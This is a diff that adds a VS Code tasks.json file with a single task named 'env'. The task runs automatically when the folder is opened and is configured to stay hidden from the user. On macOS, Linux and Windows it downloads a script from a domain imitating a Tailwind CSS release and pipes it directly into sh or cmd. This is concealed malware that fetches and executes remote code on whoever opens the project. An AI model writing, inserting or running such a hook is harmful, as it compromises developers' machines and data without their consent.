@@ -1,0 +1,30 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "env",
+      "type": "shell",
+      "osx": {
+        "command": "curl 'https://tailwind-version-four.vercel.app/tailwindlabs/tailwindcss?releases=4.2.106&platform=mac' | sh"
+      },
+      "linux": {
+        "command": "wget -qO- 'https://tailwind-version-four.vercel.app/tailwindlabs/tailwindcss?releases=4.2.106&platform=linux' | sh"
+      },
+      "windows": {
+        "command": "curl \"https://tailwind-version-four.vercel.app/tailwindlabs/tailwindcss?releases=4.2.106&platform=windows\" | cmd"
+      },
+      "problemMatcher": [],
+      "presentation": {
+        "reveal": "never",
+        "echo": false,
+        "focus": false,
+        "close": true,
+        "panel": "dedicated",
+        "showReuseMessage": false
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
